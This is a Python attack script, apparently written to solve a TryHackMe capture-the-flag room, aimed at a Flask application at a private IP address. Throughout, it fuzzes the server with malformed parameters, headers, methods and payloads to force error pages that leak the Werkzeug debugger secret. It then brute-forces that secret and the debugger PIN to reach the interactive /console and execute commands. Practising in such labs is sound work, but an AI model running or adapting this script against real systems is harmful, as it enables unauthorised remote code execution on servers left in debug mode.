import requests
import re
import urllib.parse

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# Goal: trigger a 500 error to get Werkzeug debug traceback
# The traceback page contains the secret 's' value needed for /console

print("=== Triggering 500 errors ===")

# 1) Type confusion - send list params, weird types
triggers = []

# Overflow/type confusion in params
triggers.append(("GET /cupids_secret_vault/?name[]=test", 
    lambda: s.get(f"{BASE}/cupids_secret_vault/", params={"name[]": "test"}, timeout=5)))
triggers.append(("GET /?name[]=test", 
    lambda: s.get(f"{BASE}/", params={"name[]": "test"}, timeout=5)))

# Very long values
triggers.append(("GET / with 10k param", 
    lambda: s.get(f"{BASE}/", params={"x": "A"*10000}, timeout=5)))

# Null bytes in various places
triggers.append(("GET /%00", 
    lambda: s.get(f"{BASE}/%00", timeout=5)))

# Invalid content type with body
triggers.append(("POST /cupids_secret_vault/ multipart",
    lambda: s.post(f"{BASE}/cupids_secret_vault/", 
                   files={"file": ("test.txt", "content")}, timeout=5)))

# POST to / with file
triggers.append(("POST / with file",
    lambda: s.post(f"{BASE}/", files={"file": ("test.txt", "content")}, timeout=5)))

# Send request with conflicting content-length
triggers.append(("GET / with bad Content-Length",
    lambda: s.get(f"{BASE}/", headers={"Content-Length": "999"}, timeout=5)))

# Try raw HTTP/1.0 style request tricks
triggers.append(("GET / with Transfer-Encoding: chunked",
    lambda: s.get(f"{BASE}/", headers={"Transfer-Encoding": "chunked"}, timeout=5)))

# Malformed JSON POST
triggers.append(("POST / with broken JSON",
    lambda: s.post(f"{BASE}/", data="{broken json!!!}", 
                   headers={"Content-Type": "application/json"}, timeout=5)))

# POST to vault with broken JSON
triggers.append(("POST /cupids_secret_vault/ with broken JSON",
    lambda: s.post(f"{BASE}/cupids_secret_vault/", data="{broken!!!}", 
                   headers={"Content-Type": "application/json"}, timeout=5)))

# Try to trigger Jinja2 errors with template syntax in URL
triggers.append(("GET /{{ }}",
    lambda: s.get(f"{BASE}/%7B%7B%20%7D%7D", timeout=5)))
triggers.append(("GET /{%%}",
    lambda: s.get(f"{BASE}/%7B%25%25%7D", timeout=5)))

# Try unicode errors
triggers.append(("GET / with bad Accept-Charset",
    lambda: s.get(f"{BASE}/", headers={"Accept-Charset": "\xff\xfe"}, timeout=5)))

# Extra long URL
triggers.append(("GET / very long path",
    lambda: s.get(f"{BASE}/" + "A" * 50000, timeout=10)))

# Integer overflow in param
triggers.append(("GET /?id=99999999999999999999999999999",
    lambda: s.get(f"{BASE}/", params={"id": "9" * 100}, timeout=5)))

# Multiple same-name params
triggers.append(("GET /?a=1&a=2&a=3 (multi)",
    lambda: s.get(f"{BASE}/?a=1&a=2&a=3&a=4&a=5", timeout=5)))

# PUT/PATCH/DELETE that might not be handled
triggers.append(("PUT /cupids_secret_vault/",
    lambda: s.put(f"{BASE}/cupids_secret_vault/", data="test", timeout=5)))
triggers.append(("PATCH /cupids_secret_vault/",
    lambda: s.patch(f"{BASE}/cupids_secret_vault/", data="test", timeout=5)))
triggers.append(("DELETE /cupids_secret_vault/",
    lambda: s.delete(f"{BASE}/cupids_secret_vault/", timeout=5)))

# OPTIONS *
triggers.append(("OPTIONS *",
    lambda: s.options(f"{BASE}/*", timeout=5)))

# Trigger via cookie manipulation
triggers.append(("GET / with bad session cookie",
    lambda: s.get(f"{BASE}/", cookies={"session": "x" * 1000}, timeout=5)))

# Try TRACE method
import http.client
def trace_req():
    conn = http.client.HTTPConnection("10.114.139.59", 5000, timeout=5)
    conn.request("TRACE", "/")
    return conn.getresponse()
triggers.append(("TRACE /", trace_req))

for desc, fn in triggers:
    try:
        r = fn()
        if hasattr(r, 'status_code'):
            status = r.status_code
            text = r.text
        else:
            status = r.status
            text = r.read().decode('utf-8', errors='replace')
        
        if status == 500 or "Traceback" in text or "debugger" in text.lower() or "SECRET" in text:
            print(f"  [!!!] {desc} -> {status}")
            print(f"  Body ({len(text)} bytes):")
            print(f"  {text[:1000]}")
            # Look for debugger secret
            secret_match = re.search(r's=([a-zA-Z0-9]+)', text)
            if secret_match:
                print(f"  [SECRET] s={secret_match.group(1)}")
            for f in FLAG_RE.findall(text):
                print(f"  [FLAG] {f}")
            print()
        elif status not in [200, 301, 302, 308, 404, 405, 400]:
            print(f"  {desc} -> {status} (unusual!)")
            print(f"  {text[:300]}")
    except Exception as e:
        err = str(e)
        if "timed out" not in err and "Connection" not in err:
            print(f"  {desc} -> error: {e}")

# 2) Try to access Werkzeug debugger console with dummy secret
print("\n=== Werkzeug console with params ===")
# In Werkzeug, console needs: ?__debugger__=yes&cmd=<command>&frm=0&s=<secret>
# Without proper secret, it returns 400
# Try common/default secrets
secrets_to_try = [
    "cupid_arrow_2026!!!",
    "cupid_arrow_2026",
    "2026",
    "secret",
    "debug",
    "debugger", 
    "",
    "0",
    "1",
    "test",
]

for secret in secrets_to_try:
    r = s.get(f"{BASE}/console", params={
        "__debugger__": "yes",
        "cmd": "print('hello')",
        "frm": "0",
        "s": secret
    }, timeout=5)
    if r.status_code != 400 and r.status_code != 404:
        print(f"  secret={secret} -> {r.status_code}")
        print(f"  {r.text[:300]}")
    elif r.status_code == 200:
        print(f"  [!!!] Console accessible with s={secret}!")
        print(f"  {r.text[:500]}")

# Try PIN auth
for secret in secrets_to_try:
    for pin in ["cupid_arrow_2026!!!", "2026", "123-456-789"]:
        r = s.get(f"{BASE}/console", params={
            "__debugger__": "yes", 
            "cmd": "pinauth",
            "pin": pin,
            "s": secret
        }, timeout=5)
        if "true" in r.text.lower() or r.status_code == 200:
            print(f"  PIN auth: pin={pin}, s={secret} -> {r.status_code}: {r.text[:200]}")

print("\n=== Try /console as POST ===")
r = s.post(f"{BASE}/console", data={
    "__debugger__": "yes",
    "cmd": "print('hello')",
    "frm": "0",
    "s": "cupid_arrow_2026!!!"
}, timeout=5)
print(f"  POST /console -> {r.status_code}: {r.text[:200]}")

# Try accessing console with proper Content-Type
r = s.get(f"{BASE}/console", 
    headers={"Accept": "text/html,application/xhtml+xml"},
    params={"__debugger__": "yes"},
    timeout=5)
print(f"\n  GET /console?__debugger__=yes -> {r.status_code} ({len(r.text)} bytes)")
print(f"  {r.text[:500]}")

print("\nDone.")
